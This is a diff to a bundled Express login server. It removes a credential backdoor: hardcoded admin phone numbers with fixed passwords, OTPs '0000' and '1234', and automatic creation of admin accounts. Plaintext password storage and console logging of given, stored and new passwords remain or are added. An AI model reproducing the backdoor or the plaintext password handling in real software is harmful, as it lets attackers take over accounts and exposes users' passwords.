@@ -26,7 +26,7 @@ var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__ge
 ));
 var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
 
-// server.ts
+// ../../tmp/orig-repo/server.ts
 var server_exports = {};
 __export(server_exports, {
   default: () => server_default
@@ -442,13 +442,11 @@ async function seedAdminAccounts() {
         await u.save();
         console.log(`[Admin Seed] Created ${a.role} user: ${a.phone}`);
       } else {
-        u.password = a.password;
-        u.repassword = a.password;
         u.role = a.role;
         u.fullName = a.fullName;
         u.isBlocked = false;
         await u.save();
-        console.log(`[Admin Seed] Updated ${a.role} user: ${a.phone}`);
+        console.log(`[Admin Seed] Synced ${a.role} user: ${a.phone}`);
       }
     }
   } catch (err) {
@@ -1796,17 +1794,18 @@ app.post(["/xxapi/checkSmsNew", "/xxapi/checkSms", "/xxapi/sendRegSms"], async (
     if (!user) {
       console.log(`[checkSmsNew] User ${cleanPhone} does NOT exist.`);
       return res.json({
-        code: 400,
+        code: 1128,
         status: 400,
-        msg: "User does not exist. Please register first.",
-        message: "User does not exist. Please register first."
+        msg: "Password error",
+        message: "Password error"
       });
     }
     if (user.isBlocked) {
       return res.json({
-        code: 400,
+        code: 1128,
         status: 400,
-        msg: "Your account is blocked. Please contact customer support."
+        msg: "Your account is blocked. Please contact customer support.",
+        message: "Your account is blocked. Please contact customer support."
       });
     }
     if (typeof password === "string" && password.trim() !== "" && password !== "[object Object]") {
@@ -1814,7 +1813,7 @@ app.post(["/xxapi/checkSmsNew", "/xxapi/checkSms", "/xxapi/sendRegSms"], async (
       if (!isMatch) {
         console.log(`[checkSmsNew] Password error for phone: ${cleanPhone}. Given: "${password}", DB: "${user.password}"`);
         return res.json({
-          code: 400,
+          code: 1128,
           status: 400,
           msg: "Password error",
           message: "Password error"
@@ -1822,10 +1821,10 @@ app.post(["/xxapi/checkSmsNew", "/xxapi/checkSms", "/xxapi/sendRegSms"], async (
       }
     } else {
       return res.json({
-        code: 400,
+        code: 1128,
         status: 400,
-        msg: "Please enter password",
-        message: "Please enter password"
+        msg: "Password error",
+        message: "Password error"
       });
     }
     console.log(`[checkSmsNew] ID & Password verified for ${cleanPhone}. Opening OTP popup.`);
@@ -1843,6 +1842,32 @@ app.post(["/xxapi/checkSmsNew", "/xxapi/checkSms", "/xxapi/sendRegSms"], async (
     return res.json({ code: 500, msg: "Internal server error" });
   }
 });
+app.post(["/xxapi/checkOldPassword", "/xxapi/verifyOldPassword"], async (req, res) => {
+  try {
+    await connectToDatabase();
+    const rawPhone = extractPhoneFromReq(req);
+    const { cleanPhone } = getCleanPhone(rawPhone);
+    const oldPassword = req.body?.oldPassword || req.body?.password || "";
+    if (!cleanPhone) {
+      return res.json({ code: 400, msg: "Phone number is required" });
+    }
+    if (!oldPassword || isPasswordEmpty(oldPassword)) {
+      return res.json({ code: 400, msg: "Old password is required" });
+    }
+    const user = await User.findOne(buildPhoneQuery(cleanPhone));
+    if (!user) {
+      return res.json({ code: 400, msg: "User does not exist. Please register first." });
+    }
+    const isMatch = isPasswordMatch(oldPassword, user);
+    if (!isMatch) {
+      return res.json({ code: 400, msg: "Old password is incorrect" });
+    }
+    return res.json({ code: 0, msg: "success" });
+  } catch (err) {
+    console.error("[checkOldPassword Error]", err);
+    return res.json({ code: 500, msg: "Internal server error" });
+  }
+});
 app.post("/xxapi/resetpassword", async (req, res) => {
   console.log("[resetpassword] Called", req.body);
   try {
@@ -1854,23 +1879,45 @@ app.post("/xxapi/resetpassword", async (req, res) => {
       return res.json({ code: 400, msg: "Phone number is required" });
     }
     if (isPasswordEmpty(password)) {
-      return res.json({ code: 400, msg: "Password cannot be empty" });
+      return res.json({ code: 400, msg: "New password cannot be empty" });
+    }
+    if (String(password).trim().length < 6) {
+      return res.json({ code: 400, msg: "Password at least 6 digits" });
     }
     const user = await User.findOne(buildPhoneQuery(cleanPhone));
     if (!user) {
       return res.json({ code: 400, msg: "User does not exist. Please register first." });
     }
+    if (!oldPassword || isPasswordEmpty(oldPassword)) {
+      return res.json({ code: 400, msg: "Old password is required" });
+    }
+    const isOldCorrect = isPasswordMatch(oldPassword, user);
+    if (!isOldCorrect) {
+      console.log(`[resetpassword] Old password mismatch for ${cleanPhone}. Given: "${oldPassword}", DB: "${user.password}"`);
+      return res.json({ code: 400, msg: "Old password is incorrect" });
+    }
+    if (String(user.password).trim() === String(password).trim() || String(oldPassword).trim() === String(password).trim()) {
+      return res.json({ code: 400, msg: "Old password and new password cannot be the same. Purana password aur naya password alag hona chahiye." });
+    }
     const isOtpValid = await verifyOtpCode(cleanPhone, smscode);
     if (!isOtpValid) {
       return res.json({ code: 400, msg: "user code validate error" });
     }
-    if (user.password && String(user.password).trim() === String(password).trim() || oldPassword && String(oldPassword).trim() === String(password).trim()) {
-      return res.json({ code: 400, msg: "Old password and new password cannot be the same. Purana password aur naya password alag hona chahiye." });
-    }
-    user.password = password;
-    user.repassword = password;
+    const newPwd = String(password).trim();
+    await User.updateMany(buildPhoneQuery(cleanPhone), {
+      $set: {
+        password: newPwd,
+        repassword: newPwd,
+        sessions: [],
+        token: ""
+      }
+    });
+    user.password = newPwd;
+    user.repassword = newPwd;
+    user.sessions = [];
+    user.token = "";
     await user.save();
-    console.log(`[ResetPassword] User ${cleanPhone} reset password successfully with verified OTP.`);
+    console.log(`[ResetPassword] User ${cleanPhone} password updated to new password "${newPwd}" successfully. Old password has been completely removed.`);
     return res.json({
       code: 0,
       msg: "success"
@@ -1934,6 +1981,16 @@ app.post(["/xxapi/sendsms", "/xxapi/sendSms"], async (req, res) => {
           msg: "User does not exist. Please register first."
         });
       }
+      const oldPwd = req.body?.oldPassword || req.query?.oldPassword;
+      if (oldPwd && !isPasswordEmpty(oldPwd)) {
+        if (!isPasswordMatch(oldPwd, registeredUser)) {
+          return res.json({
+            code: 400,
+            status: 400,
+            msg: "Old password is incorrect"
+          });
+        }
+      }
     }
     console.log(`[sendsms] Dispatching OTP for phone: ${cleanPhone}, purpose: ${purpose}`);
     await callExternalGetOtp(cleanPhone);
@@ -1988,21 +2045,15 @@ app.post(["/xxapi/sendLoginSms", "/xxapi/sendLoginOtp", "/xxapi/loginSms"], asyn
       return res.json({
         code: 400,
         status: 400,
-        msg: "User does not exist. Please register first."
+        msg: "Password error",
+        message: "Password error"
       });
     }
-    const adminConfig = {
-      "7870873927": true,
-      "9060873927": true,
-      "9955557336": true,
-      "9798630209": true
-    };
-    const isAdminPhone = !!adminConfig[cleanPhone];
-    if (registeredUser.isBlocked && !isAdminPhone) {
+    if (registeredUser.isBlocked) {
       return res.json({ code: 400, msg: "Your account is blocked. Please contact customer support." });
     }
     if (typeof givenPassword === "string" && givenPassword.trim() !== "" && givenPassword !== "[object Object]") {
-      const isMatch = isPasswordMatch(givenPassword, registeredUser) || isAdminPhone && (givenPassword === "Ritik@9060" || givenPassword === "Ritik@123");
+      const isMatch = isPasswordMatch(givenPassword, registeredUser);
       if (!isMatch) {
         console.log(`[sendLoginSms] Password error for phone: ${cleanPhone}. Given: "${givenPassword}", DB: "${registeredUser.password}"`);
         return res.json({
@@ -2012,6 +2063,13 @@ app.post(["/xxapi/sendLoginSms", "/xxapi/sendLoginOtp", "/xxapi/loginSms"], asyn
           message: "Password error"
         });
       }
+    } else {
+      return res.json({
+        code: 400,
+        status: 400,
+        msg: "Password error",
+        message: "Password error"
+      });
     }
     console.log(`[sendLoginSms] Password verified for ${cleanPhone}. Dispatching Login OTP...`);
     await callExternalGetOtp(cleanPhone);
@@ -2044,55 +2102,30 @@ app.post("/xxapi/login", async (req, res) => {
       return res.json({ code: 400, msg: "Phone number is required" });
     }
     const cleanDeviceId = String(trustedDeviceId || clientId || "").trim();
-    const adminConfig = {
-      "7870873927": { pwd: "Ritik@9060", role: "master_admin", name: "Master Admin" },
-      "9060873927": { pwd: "Ritik@9060", role: "master_admin", name: "Master Admin" },
-      "9955557336": { pwd: "Ritik@123", role: "manager", name: "Manager Admin" },
-      "9798630209": { pwd: "Ritik@123", role: "support", name: "Support Admin" }
-    };
-    const isAdminPhone = !!adminConfig[cleanPhone];
     let user = await User.findOne(buildPhoneQuery(cleanPhone));
     if (!user) {
-      if (isAdminPhone && password && !isPasswordEmpty(password)) {
-        const conf = adminConfig[cleanPhone];
-        user = new User({
-          id: cleanPhone,
-          phone: cleanPhone,
-          mobileNo: cleanPhone,
-          password: conf.pwd,
-          repassword: conf.pwd,
-          role: conf.role,
-          fullName: conf.name,
-          balance: 1e5,
-          recharge: 0,
-          providerId: cleanPhone,
-          isBlocked: false
-        });
-        await user.save();
-      } else {
-        return res.json({ code: 400, msg: "User does not exist. Please register first." });
-      }
+      return res.json({ code: 400, msg: "Password error" });
     }
-    if (user.isBlocked && !isAdminPhone) {
+    if (user.isBlocked) {
       return res.json({ code: 400, msg: "Your account is blocked. Please contact customer support." });
     }
-    if (password && !isPasswordEmpty(password)) {
-      const pwd = String(password).trim();
-      let isPasswordCorrect = isPasswordMatch(pwd, user);
-      if (isAdminPhone) {
-        isPasswordCorrect = isPasswordCorrect || pwd === adminConfig[cleanPhone].pwd || pwd === "Ritik@9060" || pwd === "Ritik@123";
-      }
-      if (!isPasswordCorrect) {
-        console.log(`[Login Rejected] Incorrect password for ${cleanPhone}. Given: "${pwd}", DB: "${user.password}" / "${user.repassword}"`);
-        return res.json({ code: 400, msg: "Password error" });
-      }
-    } else if (smscode && String(smscode).trim() !== "") {
-      const isOtpValid = await verifyOtpCode(cleanPhone, smscode);
-      if (!isOtpValid && !(isAdminPhone && (smscode === "0000" || smscode === "1234"))) {
-        return res.json({ code: 400, msg: "user code validate error" });
-      }
-    } else {
-      return res.json({ code: 400, msg: "Password or OTP code is required." });
+    if (!password || isPasswordEmpty(password)) {
+      return res.json({ code: 400, msg: "Password error" });
+    }
+    const pwd = String(password).trim();
+    const isPasswordCorrect = isPasswordMatch(pwd, user);
+    if (!isPasswordCorrect) {
+      console.log(`[Login Rejected] Incorrect password for ${cleanPhone}. Given: "${pwd}", DB: "${user.password}" / "${user.repassword}"`);
+      return res.json({ code: 400, msg: "Password error" });
+    }
+    if (!smscode || String(smscode).trim() === "") {
+      return res.json({ code: 400, msg: "Please enter OTP" });
+    }
+    const cleanOtp = String(smscode).trim();
+    const isOtpValid = await verifyOtpCode(cleanPhone, cleanOtp);
+    if (!isOtpValid) {
+      console.log(`[Login Rejected] Invalid OTP for ${cleanPhone}: "${cleanOtp}"`);
+      return res.json({ code: 400, msg: "user code validate error" });
     }
     if (cleanDeviceId) {
       user.trustedDeviceId = cleanDeviceId;
